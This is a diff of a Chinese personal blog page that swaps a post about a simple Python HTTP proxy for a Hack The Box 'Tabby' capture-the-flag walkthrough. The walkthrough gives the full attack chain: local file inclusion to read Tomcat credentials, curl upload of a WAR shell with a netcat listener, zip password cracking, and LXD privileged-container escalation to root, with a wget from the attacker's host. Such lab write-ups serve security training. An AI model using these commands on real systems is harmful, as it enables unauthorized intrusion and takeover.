@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>简单的实现一个HTTP代理 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="简单的实现一个HTTP代理 | 九世的博客">
+  <title>Hack the box tabby | 九世的博客</title>
+  <meta name="keywords" content=" htb ">
+  <meta name="description" content="Hack the box tabby | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1435,9 +1435,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-简单的实现一个HTTP代理" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Hack-the-box-tabby" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">简单的实现一个HTTP代理</h1>
+        <h1 class="article-title">Hack the box tabby</h1>
     
     <div class="article-meta">
         
@@ -1446,14 +1446,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">htb</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-12-02 23:11:36">2019-12-02 22:43</time>
+        创建时间:<time class="date" title="更新时间: 2020-07-08 16:18:04">2020-07-08 15:36</time>
         
     </div>
     <div class="article-meta">
@@ -1475,7 +1475,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01如何实现"><span class="toc-text">0x01如何实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02实现"><span class="toc-text">0x02实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03缺陷"><span class="toc-text">0x03缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04参考链接"><span class="toc-text">0x04参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#入口点获取"><span class="toc-text">入口点获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#立足点"><span class="toc-text">立足点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程的知识点"><span class="toc-text">过程的知识点</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1490,128 +1490,65 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>之前一直尝试先个http代理，每次都是败北而归。这次稍微好一点….补上坑吧<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575308314356&amp;di=7e29c0b116060d76c0a7daa25a63ed15&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201711%2F25%2F20171125231052_rRBuv.thumb.1000_0.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575308314356&amp;di=7e29c0b116060d76c0a7daa25a63ed15&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201711%2F25%2F20171125231052_rRBuv.thumb.1000_0.jpeg"></p>
-<h2 id="0x01如何实现"><a href="#0x01如何实现" class="headerlink" title="0x01如何实现"></a>0x01如何实现</h2><p>HTTP代理</p>
-<pre><code>request
-浏览器-&gt;py(代理)-&gt;目标
-response
-目标-&gt;py(代理)-&gt;浏览器
-</code></pre><p>获取Host头里指向的域名和端口，如果没有指定端口默认为80，处理<code>Proxy-Connection</code>头部。将<code>Proxy-Connection</code>修改为<code>Connection: close</code>。</p>
-<p>使用异步来处理请求，否则可能会出现响应跟不上的问题</p>
-<h2 id="0x02实现"><a href="#0x02实现" class="headerlink" title="0x02实现"></a>0x02实现</h2><pre><code class="python">#@author:九世
-#@time:2019/12/2
-#@file:test.py
+        <p><img src="https://s1.ax1x.com/2020/07/08/UVG59A.png" alt=""></p>
+<h2 id="入口点获取"><a href="#入口点获取" class="headerlink" title="入口点获取"></a>入口点获取</h2><p>端口扫描</p>
+<pre><code>nmap --min-rate=10000 -A -sC 10.10.10.194
+</code></pre><p>扫描结果：</p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 06:23 EDT
+Nmap scan report for 10.10.10.194
+Host is up (0.20s latency).
+Not shown: 873 closed ports, 124 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-from gevent.monkey import patch_all;patch_all()
-from gevent.server import StreamServer
-import socket
-import re
-
-class Http(object):
-    def __init__(self,text):
-        self.yuan=text
-        self.text=bytes.decode(text).replace(&#39;\r&#39;,&#39;&#39;)
-        self.headers={}
-        self.TUNNEL_OK = b&#39;HTTP/1.1 200 Connection Established\r\nConnection: close\r\n\r\n&#39;
-
-    def proxyconnection(self,text):
-        self.yuan=re.sub(b&quot;Proxy-Connection&quot;,b&quot;Connection&quot;,self.yuan)
-        self.yuan=re.sub(b&quot;keep-alive&quot;,b&quot;close&quot;,self.yuan)
-        domain=re.findall(&quot;\s.* HTTP&quot;,text)[0]
-        dtm=str(domain).rstrip().lstrip().replace(self.headers[&#39;Host&#39;],&#39;&#39;).replace(&#39;http://&#39;,&#39; &#39;).replace(&#39;https://&#39;,&#39; &#39;)
-        searchs=str(domain)
-        self.yuan=re.sub(bytes(searchs,encoding=&#39;utf-8&#39;),bytes(dtm,encoding=&#39;utf-8&#39;),self.yuan)
-
-    def jiexi(self):
-        try:
-            data=re.findall(&#39;Host[:].*&#39;,self.text)
-            if len(data)&gt;0:
-                dt=str(data[0]).replace(&#39;Host:&#39;,&#39;&#39;).split(&#39;:&#39;)
-                if len(dt)==2:
-                    self.headers[&#39;Host&#39;]=str(&#39;{}&#39;.format(dt[0]).strip().rstrip())
-                    self.headers[&#39;port&#39;]=dt[1]
-                else:
-                    self.headers[&#39;Host&#39;]=str(&#39;{}&#39;.format(dt[0])).rstrip().lstrip()
-                    self.headers[&#39;port&#39;]=80
-
-            if &#39;Proxy-Connection&#39; in self.text and not &quot;CONNECT&quot; in self.text:
-                self.proxyconnection(self.text)
-
-            if &#39;Host&#39; in self.headers:
-                return self.headers[&#39;Host&#39;],self.headers[&#39;port&#39;],self.yuan
-
-
-        except:
-            pass
-
-    def send_banners(self,host,port,data):
-        jg=b&#39;&#39;
-        c=socket.socket()
-        c.connect((host,int(port)))
-        c.sendall(data)
-        while True:
-            rc=c.recv(4096)
-            if rc:
-                jg+=rc
-            else:
-                break
-
-        return jg
-
-def main(s,address):
-    try:
-        while True:
-            request = s.recv(4096)
-            print(request)
-            obj = Http(request)
-            jg = obj.jiexi()
-            if b&#39;CONNECT&#39; in request:
-                s.sendall(obj.TUNNEL_OK)
-                while True:
-                    rv=s.recv(1024)
-                    if rv:
-                        fb=obj.send_banners(jg[0],jg[1],rv)
-                        print(fb)
-                        s.sendall(fb)
-                    else:
-                        break
-            else:
-                fb = obj.send_banners(jg[0], jg[1], jg[2])
-                s.sendall(fb)
-    except Exception as r:
-        if &#39;not subscriptable&#39; in str(r):
-            pass
-
-if __name__ == &#39;__main__&#39;:
-    print(&#39;[+] 开始监听&#39;)
-    try:
-        server=StreamServer((&quot;127.0.0.1&quot;,4444),main)
-        server.serve_forever()
-    except:
-        pass
-    &#39;&#39;&#39;
-    s=socket.socket()
-    s.bind((&#39;127.0.0.1&#39;,4444))
-    s.listen(1)
-
-    while True:
-        accept,adr=s.accept()
-        request=accept.recv(4096)
-        print(request)
-        obj=Http(request)
-        jg=obj.jiexi()
-        fb=obj.send_banners(jg[0],jg[1],jg[2])
-        accept.sendall(fb)
-    &#39;&#39;&#39;
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/12/02/QuXh3F.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/12/02/QuXvge.png" alt="QuXvge.png"></p>
-<p>小结：<br>1.解析HTTP请求获取Host头里请求的内容和端口<br>2.使用异步来处理，否则会出现响应更不上的问题<br>3.修改Proxy-Connection头为Connection:close<br>4.处理HTTPS   </p>
-<h2 id="0x03缺陷"><a href="#0x03缺陷" class="headerlink" title="0x03缺陷"></a>0x03缺陷</h2><ul>
-<li>无法转发HTTPS</li>
-<li>某些隐性BUG</li>
-</ul>
-<h2 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" title="0x04参考链接"></a>0x04参考链接</h2><p><a href="https://www.cnblogs.com/ningci/p/5446681.html" target="_blank" rel="noopener">python http代理支持 https - 宁次 - 博客园</a><br><a href="https://www.zhihu.com/question/21955083/answer/142736329" target="_blank" rel="noopener">什么是HTTP隧道，怎么理解HTTP隧道呢？ - 知乎</a><br><a href="https://codeday.me/bug/20190407/903445.html" target="_blank" rel="noopener">Python HTTPS代理隧道 - 代码日志</a><br><a href="https://codeday.me/bug/20190511/1074592.html" target="_blank" rel="noopener">python – gevent StreamServer.start()似乎没有做我期望的 - 代码日志</a></p>
+</code></pre><p>80是个静态站点，8080是Tomcat，扫描目录无果，在点击某个页面的时候看见一个file参数，一开始无法访问。加入hosts即可<br><img src="https://s1.ax1x.com/2020/07/08/UVt0hQ.png" alt=""></p>
+<p>访问之后提醒，站点曾经大量泄漏<br><img src="https://s1.ax1x.com/2020/07/08/UVtI39.png" alt=""></p>
+<p>尝试LEFI，成功<br><img src="https://s1.ax1x.com/2020/07/08/UVNCut.png" alt=""><br>得到用户名:ash</p>
+<p>版本发现<br><img src="https://s1.ax1x.com/2020/07/08/UVNE4g.png" alt=""></p>
+<p>尝试访问有趣的路径</p>
+<pre><code>/proc/self/environ
+/proc/self/fd
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+</code></pre><p>并无结果</p>
+<p>尝试读取news.php发现也不行<br><img src="https://s1.ax1x.com/2020/07/08/UVNRKI.png" alt=""></p>
+<p>google一艘，发现一个tomcat的路径：<br><img src="https://s1.ax1x.com/2020/07/08/UVUoex.png" alt=""></p>
+<pre><code>/usr/share/tomcat9/etc/tomcat-users.xml
+</code></pre><p>访问后得到想要的结果<br><img src="https://s1.ax1x.com/2020/07/08/UVUTw6.png" alt=""></p>
+<p>登录Tomcat<br><img src="https://s1.ax1x.com/2020/07/08/UVaPk8.png" alt=""></p>
+<h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><p>tomcat上传war getshell<br><a href="https://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">https://payloads.online/archivers/2017-08-17/2</a> - 渗透中tomcat部署war包Getshell</p>
+<p>使用curl getshell</p>
+<pre><code>curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/tests&#39; #上传war包为haqshell
+curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list #列出部署的war
+本机监听：nc -lvvp &lt;lport&gt; 浏览器访问：http://10.10.10.194:8080/tests
+</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVaI3Q.png" alt=""></p>
+<p>在web目录找到backup.zip,使用fcrackzip破解</p>
+<pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
+</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVdmgH.png" alt=""></p>
+<p>尝试使用爆破出来的密码登录ssh，捞走users.txt<br><img src="https://s1.ax1x.com/2020/07/08/UVaqH0.png" alt=""></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看ash用户组是lxd<br><img src="https://s1.ax1x.com/2020/07/08/UVdgxJ.png" alt=""></p>
+<p>提权参考：<a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
+<p>过程：</p>
+<pre><code>git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+wget http://10.10.14.207:8000/alpine-v3.12-x86_64-20200707_0941.tar.gz
+lxc image import ./alpine-v3.12-x86_64-20200707_0941.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVwniT.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/07/08/UVwwSe.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/07/08/UVwywt.png" alt=""></p>
+<h2 id="过程的知识点"><a href="#过程的知识点" class="headerlink" title="过程的知识点"></a>过程的知识点</h2><p><img src="https://s1.ax1x.com/2020/07/08/UV0Hud.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1621,12 +1558,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>简单的实现一个HTTP代理</p>
+    <p><span class="copy-title">文章标题:</span>Hack the box tabby</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-02, 22:43:58</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-02, 23:11:36</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2aaeb1.html" title="简单的实现一个HTTP代理">http://422926799.github.io/posts/2aaeb1.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-07-08, 15:36:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-08, 16:18:04</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5c929347.html" title="Hack the box tabby">http://422926799.github.io/posts/5c929347.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
